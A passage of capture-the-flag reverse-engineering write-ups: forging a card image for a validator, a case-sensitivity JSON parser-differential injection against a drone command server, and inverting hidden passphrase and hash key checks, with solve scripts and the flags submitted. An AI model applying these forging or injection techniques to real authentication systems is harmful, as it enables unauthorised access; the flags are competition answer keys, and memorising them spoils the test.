Reproduction summary: carve `PoshTerm.dll` from the v6 bundle manifest → extract `NODE_SEA_BLOB` → read `bundle.js`, find the hidden `service_code` command and its two MD5 gates → recover the service code `Cessna 421 Golden Eagle` from `session.log` → Wikipedia (first-flight date 1965-10-14) → JPL JD `2439047.5000000` → RC4-decrypt the embedded blob with that key. Gotchas: the archive is packed with decoy flags (env var, `Get-Flag`, `flag3000` XOR, `Unlock-Vault`, and a wall of taunts in `bundle.js`) — only the hidden command's RC4 output is real; and the whole solve is static, so the untrusted exe is never executed. The only network traffic was ordinary rate-limited reads of the public Wikipedia and NASA/JPL endpoints the challenge itself names; no CSCTF/Chronos infrastructure was touched. `tried.json` lists three submissions of the same value: the first two returned `ratelimited` (the team-wide CTFd rate limit, not judged) and the third, unchanged, was accepted.

### proprietary

> Reverse engineering · Hard · Sam  
> Points: 711 · Flag submitted by: secretNinja

**The flag**

`CSCTF{EFAmkcUr3HESzVeb1e5R2up3}`

This is a per-team random value issued by our assigned instance's card checker after a forged operator
card passes all five validator stages. The reversing work is identical for every team; only the final
grant string differs.

**Challenge**

District 7's maintenance terminal only opens for a valid operator card. To get the flag you reverse an
offline validator, learn the card format, forge a `card.bin`, and upload it to the per-team web card
checker, which then reveals the maintenance code. `player-handout.zip` contains:

| File | Role |
| --- | --- |
| `cardval` | stripped Linux x86-64 **Rust** ELF: `cardval check card.bin [--json]` |
| `starter.bin` | a valid 16-byte empty card (`VCDF`, v2, 0 apps) |
| `server.py`, `Dockerfile*`, `docker-compose.yml` | local copy of the web checker; it shells out to `cardval ... --json` and only ever returns the placeholder grant `D7-LOCAL-TEST` |
| `README.md`, `DESCRIPTION.md`, `SHA256SUMS.txt` | instructions |

The live checker is a `web` challenge on port 8080. Its page header carries a static "5/5 Validator
stages" stat (that is just the stage count, not a per-upload score); the real verdict for an upload is the
separate **Accepted**/**Rejected** panel. The checker runs the exact same five `cardval` stages as the
handout, so the whole challenge can be solved against the local copy and then confirmed with a single
upload to the assigned instance.

**Tools used**

radare2 with r2ghidra (`r2pm -ci r2ghidra`) to decompile the stripped Rust binary, a Python card builder,
and the handout's own `--network none --read-only` Docker wrapper to run `cardval` locally. Per the repo
rule, `cardval` was never run on the host — only inside that sandbox.

**Approach**

1. **Decompile the three functions that matter.** All three are real function entry points in the
   stripped ELF and are invoked, in this order, by the orchestrating check at `0x11a90` (itself called
   from `0x17560`):
   - `0x11a90` — the big structural/semantic check (≈14.6 KB function). At `0x14a82` it calls the
     script-decoder helper `0x18f60`, at `0x151b3` the session interpreter `0x19430`, and at `0x1520d`
     the final verifier `0x19c90`.
   - `0x19430` — the scripted-session interpreter. It dispatches on the command opcodes (`movzx eax,al`
     then a `cmp` ladder over `0x19`/`0x28`/`0x35`/… ) and references the ledger AID `0x6D2A91`.
   - `0x19c90` — the final verifier, which walks the same opcode set a second time and runs last.
   - (`0x18f60` is the helper that LCG-decodes the 210-byte script — see 4.5.)

   These addresses and the call order were re-confirmed statically with radare2 for this write-up
   (the binary was not executed).

2. **Pin the integrity hash using the starter card.** `starter.bin` is the smallest known-good sample, so
   it fixes the hash. The function is a non-cryptographic rolling hash (the README even says so):

   ```python
   h = 0xC1FC1E5A
   for b in data:
       h = rotl32(h, 5) ^ b
       h = (h * 0x9E3779B1) & 0xFFFFFFFF
       h ^= h >> 15
   ```

   Hashing the 16-byte image with its checksum field zeroed reproduces the stored value `0xad6935bd`.
   App checksums cover each app's byte range; the image checksum covers the whole file. Both are computed
   with the header checksum **and every app checksum field** set to zero, so you compute them all on the
   zeroed image first and patch them in last.

3. **Recover the VCDF v2 layout** (all little-endian):
   - **Image header (16 bytes):** `"VCDF"`, version `2`, flags `0`, app count (≤ 8), reserved `0`,
     `u32 total_length` (= file size), `u32 image_checksum`.
   - **Application (11-byte header):** 3-byte AID (nonzero, unique), `0`, `nkeys` (≤ 4), `nfiles` (≤ 8),
     `0`, `u32 app_checksum`; then `nkeys × u32` keys, then the files.
   - **File:** 4-byte header `[id < 32, type ≤ 3, access, 0]`, then a type-specific body — type 0 data
     (`u16 len ≤ 512` + bytes), type 1 value (`u32 lo, hi, value`), type 2/3 linear/cyclic record
     (`u16 size 1..64`, `u16 capacity 1..32`, `u16 count`, then `count × size` bytes). Each access byte is
     two nibbles: `F` free, `E` never, anything else a key index.

4. **The five checks.**
   1. **Header** fields, plus length equal to file size.
   2. **Structure and checksums** — bounds, unique AIDs, and the app and image checksums.
   3. **Credential app `0xA17E2D`** — 0 keys and one 16-byte data file (id 0, access `0xFF`):
      `u32 operator_id` (nonzero), `u16 start ≤ 2026 ≤ u16 end`, `byte8`, `byte9` with bit 0 set, and
      bytes 10..15 zero. The forge packs this as
      `struct.pack('<IHHBB', opid, 2020, 2030, 0, 1) + b'\0'*6` — a 16-byte payload with the validity
      window straddling 2026 and bit 0 of `byte9` set.
   4. **Work-ledger app `0x6D2A91`** — 2 keys and 4 files: f0 value file (access `0x01`, `lo=0`,
      `hi=5000`), f1 linear record file (access `0x01`, record size 16, capacity 8), f2 data file
      (access `0xFE`, 4-byte token), f3 cyclic record file (access `0x01`, record size 8, capacity 4).
      The keys are derived from the operator ID with the same hash and seed as the checksums:
      `k0 = H(u32le(opid))`, `k1 = H(u32le(k0) || 0x01)`.
   5. **Scripted shift session (the real puzzle).** `cardval` holds a 210-byte session script (35 six-byte
      commands) at file offset / vaddr `0x81fb`, XORed with an 8-bit LCG keystream: seed `u = 0x6d`, and
      for each byte `u = (u*73 + 41) & 0xff` is stepped **before** use, so the first key byte is
      `0x6d*73+41 mod 256`, not `0x6d`. Each decoded command is `opcode, file/arg byte, u32le operand`;
      the first is `d3 01 2d7ea1` (select app `0xA17E2D`). The interpreter replays a fixed shift against
      the ledger:
      - selects both apps and asserts the ledger starts at value **2500** with empty record files (the
        `0x81 03` opcode is a value assertion, reused later for 3500 and 2250, so the card must already
        hold 2500 — the script does not set it);
      - runs a probe transaction — `+1000` (`a6 01 000003e8`) → assert 3500 (`81 03 00000dac`),
        with an over-limit `+999999` attempt (`a6 00 000f423f`) against the ledger's 5000 cap — then
        rolls the whole probe back (opcode `0x28`, `28 01`), re-asserting 2500 (`81 03 000009c4`) and
        leaving no records or events. This probe/rollback sub-step was independently re-decoded from the
        210-byte script for this write-up and is genuinely present in the binary; `build_card.py` only
        needs the net post-session state, so it encodes just the final sequence below, but the script
        `cardval` replays really does perform the probe and roll it back;
      - applies **+200, +300**, then **-250 three times**, ending at an asserted **2250**;
      - appends 3 linear records `{0xfa, n, 3}` for n = 1, 2, 3 (16 bytes each);
      - writes cyclic event-log entries with sequence numbers 2..5. Capacity is 4, so the earliest drops
        out, leaving `(2,300,2) (1,250,3) (1,250,4) (1,250,5)` (8 bytes each: `u8 type, u16 amount,
        u32 seq, pad`);
      - finally checks that the token in f2 equals
        `H(u32 value || u32 nrec || records || u32 nev || events)` over the **post-session** state.

      You cannot satisfy this by editing fields until it passes: the token has to be the hash of the state
      the script leaves behind, so the forger must simulate the session offline and write that hash in
      before the validator runs it.

5. **Forge the card.** `workspace/9132-proprietary/solve/build_card.py` builds the image: operator ID
   `0x0D7C0DE1`, validity window 2020..2030, `byte9 = 1`; derived keys `k0 = 0xdb51c6d8`,
   `k1 = 0x05acdee9`; f0 = value 2500 in [0, 5000]; f1 and f3 start empty; f2 = token `0x5bf4c77b` (the
   hash of the simulated final state). It lays out both apps, hashes each app range and the whole image
   with every checksum field zeroed, then patches the checksums in:

   ```sh
   python3 -I solve/build_card.py solve/card.bin
   # wrote solve/card.bin (114 bytes) opid=0xd7c0de1 k0=0xdb51c6d8 k1=0x5acdee9 token=0x5bf4c77b
   ```

   Output is a 114-byte card, SHA-256 `7911cc1a17fc5245ee0e158907643afc027d032a1d93a049a7802627930a9abe`.

6. **Validate locally, then one upload.** The handout's own Docker wrapper runs `cardval` with no network
   and a read-only root, which is the only place `cardval` was executed:

   ```sh
   docker build -t district7-cardval files/handout
   docker run --rm --network none --read-only -v "$PWD/solve:/cards:ro" -w /cards \
     district7-cardval check card.bin
   # [1/5]..[5/5] PASS, ACCEPTED
   ```

   `--json` returned `{"accepted":true,"checks_passed":5,"total_checks":5}`. We then spawned our team's own
   instance through the CTFd container plugin and made a single upload to its `/check` endpoint,
   `curl -F card=@solve/card.bin http://<instance>/check`. The response (saved as
   `solve/checker_response.html`) showed **Accepted**, "5/5 Validator stages", and the grant
   `CSCTF{EFAmkcUr3HESzVeb1e5R2up3}`; the instance was stopped afterwards. (The `card.bin` in the workspace
   root is an earlier build that passed only 4 of 5 checks and was never submitted; only `solve/card.bin`
   was.)

**Why it works**

Every check runs offline inside `cardval`. The integrity hash is unkeyed, so any field can be edited and
re-checksummed. The "secret" ledger keys are derived from the operator ID the card itself supplies, so
they are not secret at all. The session script is obfuscated with a reversible 8-bit LCG XOR, not
encrypted; once decoded, the shift it replays is deterministic, so the post-session state — and therefore
the token hash the final stage demands — can be computed ahead of time and baked into the card.

**Validation / reproduction**

Re-checked offline for this write-up: the rolling hash reproduces `starter.bin`'s stored checksum
`0xad6935bd`; `build_card.py` rebuilds `solve/card.bin` byte-for-byte (SHA-256 `7911cc1a…9abe`); decoding
210 bytes at `0x81fb` with the LCG yields the 35 commands and the operands above (2500, 1000, 999999,
3500, 200, 300, 250, 2250, record numbers 1..3); in the sandbox `solve/card.bin` gives `[1/5]..[5/5]
PASS, ACCEPTED` while the root-level `card.bin` fails stage 5; and the saved checker response contains
"Accepted" and the flag. The flag was accepted on the first CTFd submission (`tried.json` records a single
`correct` attempt). The whole lane — triage, the r2ghidra build, the three decompiled functions, the
format model, the LCG decode, the Python builder, the sandbox validation, and the one upload plus one
guarded submit — was driven by a single Claude solver subagent; no hints were bought, and the only network
traffic off the workspace was the one card upload to our own instance.

Gotcha: the LCG is stepped *before* each byte, so seeding the stream naively (using `0x6d` as the first
key byte) desynchronizes the whole decode. The keystream loop was located in the binary and matches
exactly: `lea edx,[rcx+rcx*8]` (×9) then `lea ebp,[rcx+rdx*8]` (u+72u = ×73), `add bpl,0x29` (+41),
`xor` against the ciphertext byte, over a 210-byte (`0xd2`) loop at `0x18f60` reading `0x81fb`. The
three decompiled function addresses (`0x11a90`/`0x19430`/`0x19c90`) and the opcode semantics were
independently re-confirmed for this write-up: all three are real functions called in order by the
check at `0x11a90`, the interpreter at `0x19430` dispatches on the opcode bytes, and re-decoding the
script reproduces the documented command stream (including the real `+1000`/over-limit/rollback probe).
Not separately pinned down: the exact event-log byte layout beyond the fact that the card built from it
passes all five stages.

### Split Horizon

> Reverse engineering · Medium · Dan-Andrei Grigorescu  
> Points: 270 · Flag submitted by: secretNinja

**The flag**

`CSCTF{KoKRYKUJoLqzJda22tiJHAA0}` (a per-team random flag, returned by the challenge instance as the `incident_token`)

**Challenge**

A TL-9 Vireo reconnaissance UAV of the Aurelian Air Surveillance Corps drifted off its approved waypoint mid-sortie. The command server's signed audit trail says the flight was nominal — every waypoint within tolerance, hash chain intact — yet a state actor (tracked as Sable Drift) is believed to have injected a single crafted command. The player is the attribution analyst: given the uplink capture, the drone software, and the signed audit trail, prove the waypoint the drone actually flew and explain why the server never saw it. The CTFd attachment is only a `README.txt`; the real artifacts are generated per team and served by the team's own container instance at `/files/`, with `GET /schema` giving the submission format and `POST /submit` taking the report.

Pulled from our assigned instance into the workspace:

| File | What it is |
| --- | --- |
| `session.pcap` | uplink capture: a TCP session (Hellos both ways, then command/telemetry frames), plus a `curl` fetch of `/vireo-ctl.dll` |
| `vireo-ctl.dll` | the drone's flight-control client (.NET assembly) |
| `command-server.go` | the ground server's audit-trail generator |
| `manifest.json` | mission `AV-18F48D`, approved waypoint `47.8091, 20.0478`, tolerance `0.001` deg, audit pubkey |
| `audit.log` | 9 hash-chained entries, all `NOMINAL`, with an Ed25519-signed summary |
| `sigint.txt` | framing: treat the pcap and drone software as primary evidence, the log as corroboration |

**Approach / walkthrough**

*1. Reverse the drone client (`vireo-ctl.dll`).* Decompile the .NET assembly with `ilspycmd` (output saved as `files/vireo.cs`; static only, the DLL is never run). The protocol in `Vireo.Uplink.Protocol`:

- **Framing:** `"VW"` magic (`0x56 0x57`), a 1-byte type (1 Hello, 2 Command, 3 Telemetry), and a big-endian u16 length.
- **Handshake:** each side sends a 16-byte random nonce in a Hello. Then `session_key = HMAC-SHA256(key = MaskA XOR MaskB, msg = clientNonce || serverNonce)[:16]`, where `MaskA` and `MaskB` are two 32-byte arrays hard-coded in the DLL — the "shared secret" ships inside the client.
- **Commands:** type-2 payloads are repeating-key XOR with the 16-byte session key (`Protocol.Mask`).
- **Parsing:** `CommandCodec.Parse` calls `System.Text.Json.JsonSerializer.Deserialize<CommandEnvelope>` with a *default* `JsonSerializerOptions()`. Properties bind via `[JsonPropertyName("waypoint_lat")]` and friends. Default options match property names **case-sensitively**, so only the exact lowercase keys bind; `WAYPOINT_LAT` is ignored.

*2. Read the ground server (`command-server.go`).* The server parses the same JSON with Go's `encoding/json` v1 `json.Unmarshal`, whose key matching is **case-insensitive, and on a duplicate key the last value wins** (the source comments say so directly). It checks `|lat - approved| <= 0.001` and `|lon - approved| <= 0.001` on the waypoint it parsed, then logs `NOMINAL`/`WAYPOINT_MISMATCH` with a salted commitment `SHA-256(salt || "%.6f|%.6f")` over that waypoint. The coordinates themselves are never logged, and the salt is never published.

*3. Decrypt the uplink.* Reassemble both directions of the TCP stream and split into VW frames. The two Hello nonces are client `7b2841d28c6f2a963d88963ad7b39da7` and server `ff5a19c1373b584372e2bab978929f08`; deriving the key gives `3585fe3780ab616df2fd1a2aa56af02a`. XOR each type-2/3 payload with it (scapy + hmac, run with `python -I`, no artifact executed):

```python
S   = bytes(a ^ b for a, b in zip(MaskA, MaskB))          # 32-byte arrays from the DLL
key = hmac.new(S, client_nonce + server_nonce, hashlib.sha256).digest()[:16]
pt  = bytes(c ^ key[i % 16] for i, c in enumerate(payload))
```

The decrypted command stream (waypoint fields only):

| seq | waypoint_lat / lon (lowercase) | duplicate UPPERCASE keys |
| --- | --- | --- |
| 1, 6, 8 | 47.8091 / 20.0478 | none |
| 2 | 47.8090 / 20.0477 | `WAYPOINT_LAT 47.8090`, `WAYPOINT_LON 20.0477` (same values — decoy) |
| 3, 7, 9 | 47.8091 / 20.0477 | none |
| 4 | 47.8090 / 20.0477 | none |
| **5** | **47.8104 / 20.0518** | **`WAYPOINT_LAT 47.8099`, `WAYPOINT_LON 20.0469`** |

Two telemetry frames (type 3) report the drone at `gps_lat 47.8104, gps_lon 20.0517`.

*4. The injected command.* Seq 5 carries the waypoint keys twice — lowercase first, uppercase second — with *different* values:

- **Drone (System.Text.Json, case-sensitive):** binds only `waypoint_lat`/`waypoint_lon` → flies to **47.8104, 20.0518**, about 330 m off the approved point. The telemetry fix `47.8104, 20.0517` matches it by value.
- **Server (Go encoding/json v1, case-insensitive, last wins):** `WAYPOINT_LAT`/`WAYPOINT_LON` overwrite the same fields → it validates and commits **47.8099, 20.0469**, which is within 0.001 deg of approved `47.8091, 20.0478` (dlat 0.0008, dlon 0.0009), so it logs `NOMINAL`.

Seq 2's uppercase duplicates hold the same values as its lowercase pair, so seq 2 is a decoy; seq 5 is the only command where the two parsers disagree.

*5. Report.* `GET /schema` defined a JSON report. `POST /submit` carried: executed waypoint `47.8104 / 20.0518`, logged waypoint `47.8099 / 20.0469`, injected command `seq 5`, affected fields `waypoint_lat` + `waypoint_lon`, mechanism `case_insensitive_last_wins_vs_case_sensitive_exact`. The instance answered `correct` with an `incident_token` — the flag — which was then submitted to CTFd (`./csctf submit 9105 'CSCTF{KoKRYKUJoLqzJda22tiJHAA0}'`) and accepted on the first attempt.

**Why it works**

This is a parser differential. Two standard JSON libraries disagree on duplicate keys that differ only in case, so one wire message means two different things. The drone's case-sensitive parser acts on the lowercase pair; the server's case-insensitive, last-wins parser validates the uppercase pair. The audit trail is honest about what the *server* parsed — which is exactly why the hash chain and Ed25519 signature verify — but the server never saw the waypoint the drone actually acted on.

**Validation / reproduction**

Offline, each `entry_hash = SHA-256(prev || "prev_hash|seq|status|commit")` recomputes from genesis (32 zero bytes) to the `chain_root`, and the Ed25519 signature over the root verifies under the manifest's `audit_pubkey_b64`. Commitments line up with waypoint values: equal waypoints share a commitment (seq 1/6/8 share `45810f53...`, seq 3/7/9 share `21d022a3...`, seq 2/4 share `d5197779...` — confirming seq 2's duplicate keys changed nothing), and seq 5's `f025ed86...` is the only commitment that appears once. The instance's report checker returned `correct`; the token `CSCTF{KoKRYKUJoLqzJda22tiJHAA0}` was accepted by CTFd on the first submission (`tried.json`).

Reproduction summary: decompile `vireo-ctl.dll` → recover the framing, the `MaskA`/`MaskB` arrays, and the HMAC key schedule → reassemble the pcap, take both Hello nonces, derive key `3585fe37...`, XOR each payload → read the per-seq JSON, spot seq 5's case-differing duplicate keys → compute both parsings → report server-behaviour-first. Gotchas: the derived key is the first 16 bytes of the HMAC only; the capture is synthetic, so the telemetry corroborates seq 5 by value, not by frame timing (the two telemetry frames sit just before the seq-4 and seq-7 commands and travel in the same ground-to-drone direction); and the `/submit` checker is the instance's report grader, not the CTFd judge — a first attempt with the *drone-first* mechanism ordering returned `correct:false`, and swapping to server-first order passed (that miss did not count against CTFd). Note the description's "~380 m" drift versus the ~330 m seq-5 offset we computed from the approved point; the exact figure was not pursued and does not change the attribution.

### The Lock Box

> Reverse engineering · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{06_ash_hawk_road_at_garrisoned_38318f}`

The pass phrase the gate unit accepts *is* the flag: once the hidden check is inverted it prints a
well-formed `CSCTF{...}` string, so there is no separate decoding step.

**Challenge**

Operation Dawn, annex 06. The Ash gate guards run a small field unit (`lockbox`) at the north canal
crossing: you hand it a pass phrase and it opens the gate or refuses. We captured one. It will not tell
you the phrase it is waiting for; the task is to recover it. The handout is `lockbox.zip` (SHA-256
`d805f832eb72f56b20ef2e55de4757430e4125545a132285a41b46fbdb0f232c`), which unpacks to a single ELF.

**Tools used**

`readelf`, GNU `objdump`, and Python (plus `unzip`/`file`/`strings` for the first look). On macOS put
Homebrew's binutils first on `PATH` so `readelf`/`objdump` are the GNU builds. Everything below is static;
the only step that executes the binary is an optional end-of-solve sanity check on Linux x86-64.

**Approach**

1. **Identify and skim.** `unzip lockbox.zip && file lockbox` reports an *ELF 64-bit LSB pie executable,
   x86-64, dynamically linked, stripped*. Stripped PIE, so no symbol names to lean on. `strings -n 8
   lockbox` shows the UI is `gatelock <status|log|open> [phrase]`, with one "accepted" line and one
   "refused" line. Three oddities stand out: a taunt about "last week's code", a 33-character run of junk
   (`4+>5{(>(:6>{:5?{625?{/3>{/)2+,2)>`), and a `LOCKBOX1,` magic that looks like a data blob.

2. **Find `main` and read the `open` branch.** `readelf -h` gives entry `0x13a0` (`_start`), which loads
   `main` into `rdi` before `__libc_start_main`:

   ```
   13b8: lea rdi,[rip+...]   # 11c0
   13bf: call QWORD PTR [rip+...]   # __libc_start_main
   ```

   So `main` is at `0x11c0`. Disassembling it, the `open` branch copies `argv[2]` into a stack buffer via
   a helper at `0x1490` (a `strncpy` of up to 255 bytes that strips a trailing `\r`/`\n` and returns the
   length), then:
   - if the phrase is 33 bytes (`0x21`) and every byte XOR `0x5b` equals the junk at `0x2200`, prints the
     quartermaster's taunt;
   - **either way**, reads a 32-bit global at `0x4014` and prints "accepted" only if it equals `0x5a`,
     otherwise "refused".

   Decoding the junk confirms the decoy. `.rodata` loads at vaddr `0x2000` from file offset `0x2000`, so
   addresses double as file offsets:

   ```sh
   python3 -c "d=open('lockbox','rb').read(); print(bytes(b^0x5b for b in d[0x2200:0x2221]).decode())"
   # open sesame and mind the tripwire
   ```

   `open sesame and mind the tripwire` is "last week's code": it only earns the taunt, and nothing on that
   path writes `0x4014`, so the gate still refuses. The real verdict is set somewhere else.

3. **Find who sets the verdict.** Grep the disassembly for the global:

   ```sh
   objdump -d -M intel lockbox | grep 4014
   # 11b0: mov DWORD PTR [rip+...],eax   # 4014   <-- the only write
   # 1291: mov eax,DWORD PTR [rip+...]   # 4014   <-- main reads it
   ```

   The one write is at `0x11b0`, inside a function starting at `0x10e0` that nothing calls directly. The
   constructor table explains it:

   ```sh
   objdump -s -j .init_array lockbox
   # 3d90  80140000 00000000 e0100000 00000000
   ```

   `.init_array` holds two little-endian pointers: `0x1480` (GCC's `frame_dummy`) and `0x10e0`. glibc runs
   everything in `.init_array` **before `main`, with the same `argc`/`argv`**. So `0x10e0` is a hidden
   constructor that inspects the command line and leaves its verdict in `0x4014` for `main` to read.

4. **Read the constructor.** `objdump -d -M intel --start-address=0x10e0 --stop-address=0x11c0 lockbox`
   decodes to the following (registers from the listing in the comments):

   ```c
   int verdict;                                  /* dword at 0x4014, starts 0 */

   void lock_check(int argc, char **argv)        /* 0x10e0, run from .init_array */
   {
       unsigned char buf[256];
       const unsigned char *key    = (void *)0x224d;  /* 8 bytes */
       const unsigned char *target = key + 8;         /* 0x2255, 44 bytes */

       if (argc <= 2 || strcmp(argv[1], "open") != 0) return;
       if (copy_phrase(argv[2], buf) != 44) return;   /* same helper at 0x1490 */

       unsigned char s = 0x5b;                   /* esi: running state */
       int ok = 1;
       for (int i = 0; i < 44; i++) {
           unsigned char x = rol8(buf[i] ^ s, (1 + 3 * i) & 7) + key[i & 7];
           if (x != target[i]) ok = 0;           /* cmovne */
           s += i + x;                            /* add esi,eax ; add esi,edx */
       }
       verdict = ok ? 0x5a : 0x17;               /* branch-free cmp/sbb/and/add */
   }
   ```

   Details worth pinning from the assembly: the rotate count starts at 1 and grows by 3 per byte, and an
   8-bit `rol` by `n` equals `rol` by `n mod 8`, so it is `(1 + 3*i) & 7`. Only the low byte of the state
   matters (only `dl` is rotated/compared), so doing the state arithmetic mod 256 is exact. The verdict
   store is a branch-free `ok ? 0x5a : 0x17`. The key and target are the `LOCKBOX1,` blob: magic
   `LOCKBOX1`, a `u32` length `2c 00 00 00` (44), seed byte `5b`, 8 key bytes `63 0e fa b0 e3 84 22 68`,
   then 44 target bytes.

5. **Invert the check.** Each step is a bijection on one byte, and the running state is fed only by `i`
   and the output byte `x`, which for the correct phrase is the known target byte. So the state is known
   at every position without knowing the phrase: walk the target front-to-back and peel off `p[i]`.

   ```python
   data   = open("lockbox", "rb").read()
   LENGTH = 0x2C
   SEED   = 0x5B
   KEY    = data[0x224D:0x224D + 8]
   TARGET = data[0x2255:0x2255 + LENGTH]
   ror8 = lambda v, n: ((v >> (n & 7)) | (v << (8 - (n & 7)))) & 0xFF

   s, phrase = SEED, bytearray()
   for i in range(LENGTH):
       t = TARGET[i]
       phrase.append(ror8((t - KEY[i & 7]) & 0xFF, 1 + 3 * i) ^ s)
       s = (s + i + t) & 0xFF
   print(phrase.decode())
   # CSCTF{06_ash_hawk_road_at_garrisoned_38318f}
   ```

   The solve script re-runs the loop forward as an `assert` to prove the recovered phrase satisfies the
   constructor's comparison before trusting it.

**Why it works**

The real check is hidden in an ELF constructor listed in `.init_array`, which glibc runs before `main`
with the same arguments, and it stores its verdict in a global that `main` only reads. `main`'s own XOR
comparison is a decoy that can never open the gate — nothing on that path writes `0x4014`. The
constructor's per-byte transform (XOR with a running state, an 8-bit rotate, add a key byte) is a
bijection on each byte, and the state depends only on values the defender stored (the seed, `i`, and the
target). That makes the whole check reversible in a single forward pass, with no search.

**Validation / reproduction**

The recovered phrase was pushed back through a forward re-implementation of the loop (an `assert` in the
solve script) and it starts with `CSCTF{`, so the pass phrase is the answer itself. On Linux x86-64 the
behavior can be confirmed directly — last week's code still bounces, the recovered phrase opens the gate:

```sh
chmod +x lockbox
./lockbox open "open sesame and mind the tripwire"
# the quartermaster laughs - that is last week's code, soldier
# GATE: pass phrase refused - crossing barred
./lockbox open "$(python3 solve.py)"
# GATE: pass phrase accepted - crossing open
```

The flag was accepted on the first submission.

Reproduction summary: unzip, `strings` to spot the decoy and the `LOCKBOX1,` blob, locate `main` via
`_start`, grep for the verdict global, follow `.init_array` to the hidden constructor, transcribe its
per-byte loop, then invert it with the saved 8-byte key and 44-byte target. Gotcha: the `main`-side XOR
string is a deliberate trap — matching it changes nothing, because the verdict is written only by the
constructor that ran before `main`.

### Uplink Denied

> Reverse engineering · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{cau_reset_09ff4472cbe8e0}`

The brief asks you to submit `CSCTF{<key>}` with `<key>` replaced by the exact 24-byte recovery key,
keeping case and adding no whitespace. The recovered key is `cau_reset_09ff4472cbe8e0`, so the flag is the
value above. It is deterministic — the key is the unique preimage of three constants baked into the
binary, not a per-team value — so the same key is recovered on every run.

**Challenge**

A hostile-state operation disabled the Meridian-class command-authentication unit (CAU) aboard the
fictional DORVIX-7 satellite; the CAU now rejects every operator command. Recover the 24-byte recovery
key it accepts. Static analysis is enough, and the binary is marked untrusted. Attachment: `cau_verify`,
a Linux x86-64 ELF, 682,600 bytes, SHA-256
`19fc211ceda00357c70c5039dd882f11491c8bfb092b15824bc13f2bdc84990c`.

**Tools used**

GNU `objdump` and Python (plus `sha256sum`/`file` to confirm the download). The binary was never run —
everything is static disassembly, matching the "untrusted" note.

**Approach**

1. **Set up and identify.** Drop `cau_verify` into an empty folder and confirm the download against the
   brief: `sha256sum cau_verify` must print
   `19fc211ceda00357c70c5039dd882f11491c8bfb092b15824bc13f2bdc84990c`. `file cau_verify` reports *ELF
   64-bit LSB executable, x86-64, statically linked, stripped*. Static glibc is compiled in and there are
   no symbols, so there is no `main` to look up by name. `objdump -f` gives entry `0x401650` — glibc's
   `_start`. Nothing below executes the binary; the brief's "untrusted" note is honored by staying purely
   static.

2. **Find `main`.** `_start` passes the address of `main` to `__libc_start_main` in `%rdi`:

   ```
   401664: mov $0x4014f0,%rdi
   40166b: addr32 call 0x4028f0        # __libc_start_main
   ```

   So `main` is at `0x4014f0`, and since `_start` immediately follows it, that also marks where `main`
   ends. Disassemble the range `0x4014f0..0x401650`.

3. **Read the check.** `main` first calls a `.plt` stub (`0x4010c8`) on `argv[1]` and compares the result
   with `0x18` — that is `strlen`, so the key must be exactly 24 bytes. A helper at `0x401780` is just
   `mov (%rdi),%rax; ret`: it reads 8 key bytes as one little-endian `u64`. Each 8-byte block `x` then
   goes through five steps, with `%rsi = C1 = 0x9df50ad53e8f1c7b` and `%rcx = C2 = 0xc17a4b92d6e30f55`
   (`shr $0x21` is a shift by 33):

   ```c
   x ^= x >> 33;
   x *= C1;
   x ^= x >> 33;
   x *= C2;
   x ^= x >> 33;
   ```

   This is the shape of MurmurHash3's `fmix64` finalizer with custom multipliers. The three block hashes
   are compared against three stored 64-bit constants, and `ACCESS GRANTED` prints only if all three
   match. Two tiny helpers confirm the I/O: `0x401780` is `mov (%rdi),%rax; ret` (load 8 key bytes as a
   little-endian `u64`), and `0x401790(fd, s)` takes `strlen(s)` and tail-jumps into glibc's `write` to
   print a string. Dumping `.rodata` around `0x479000` shows what those pointers reference:

   ```sh
   objdump -s -j .rodata --start-address=0x479000 --stop-address=0x479070 cau_verify
   # 479000 01000200 00000000 4d657269 6469616e  ........Meridian
   # 479010 2d636c61 73732043 4155202f 2f207265  -class CAU // re
   # 479020 636f7665 72792061 75746865 6e746963  covery authentic
   # 479030 6174696f 6e0a0000 75736167 653a2063  ation...usage: c
   # 479040 61755f76 65726966 79203c72 65636f76  au_verify <recov
   # 479050 6572792d 6b65793e 0a004445 4e494544  ery-key>..DENIED
   # 479060 0a004143 43455353 20475241 4e544544  ..ACCESS GRANTED
   ```

   `0x479008` and `0x479038` are the banner and the `usage: cau_verify <recovery-key>` line, `0x47905a`
   is `DENIED` and `0x479062` is `ACCESS GRANTED` — which nails down that the success path is gated
   solely on the three hash comparisons.

4. **Pair each block with its target.** The compiler interleaved blocks 0 and 1, so the pairing has to be
   read from the registers, not from a decompiler (Ghidra folds `main` into a bogus function at
   `0x4012aa` and drops block 0's first three steps). Block 0 is loaded at `0x401559` and carried in
   `%rdx` across the second load call, while block 1 is mixed in `%rax`; block 2 runs straight afterward:

   | Block | Key bytes | Ends in | Must equal | Compared at |
   |---|---|---|---|---|
   | 0 | `key[0:8]`   | `%rdx` | `0xd8dba78e270f595d` | `0x4015ba` |
   | 1 | `key[8:16]`  | `%rax` | `0x25d4e9834acb3349` | `0x4015d2` |
   | 2 | `key[16:24]` | `%rax` | `0x976a0bc7e24f7338` | `0x401610` |

5. **Invert the mix.** Every step is reversible. `x ^ (x >> 33)` is its own inverse on 64-bit values
   (applying it twice cancels the shifted term, and `x >> 66` is 0). `C1` and `C2` are odd, so they are
   invertible mod 2^64 via `pow(C, -1, 1 << 64)`. Run the steps backward on each target, pack the three
   results little-endian, and join:

   ```python
   MASK = (1 << 64) - 1
   C1 = 0x9df50ad53e8f1c7b
   C2 = 0xc17a4b92d6e30f55
   TARGETS = [0xd8dba78e270f595d, 0x25d4e9834acb3349, 0x976a0bc7e24f7338]
   xorshift = lambda x: x ^ (x >> 33)

   def mix(x):
       x = xorshift(x) * C1 & MASK
       x = xorshift(x) * C2 & MASK
       return xorshift(x)

   def unmix(h):
       x = xorshift(h) * pow(C2, -1, 1 << 64) & MASK
       x = xorshift(x) * pow(C1, -1, 1 << 64) & MASK
       return xorshift(x)

   blocks = [unmix(t) for t in TARGETS]
   assert [mix(b) for b in blocks] == TARGETS
   key = b"".join(b.to_bytes(8, "little") for b in blocks)
   print(key, len(key))                       # b'cau_reset_09ff4472cbe8e0' 24
   print("CSCTF{" + key.decode() + "}")        # CSCTF{cau_reset_09ff4472cbe8e0}
   ```

   The recovered 24 bytes `cau_reset_09ff4472cbe8e0` are all printable, which is the sanity check that the
   pairing was read correctly. The `assert` re-runs the forward mix to confirm the three preimages land
   back on the stored constants.

**Why it works**

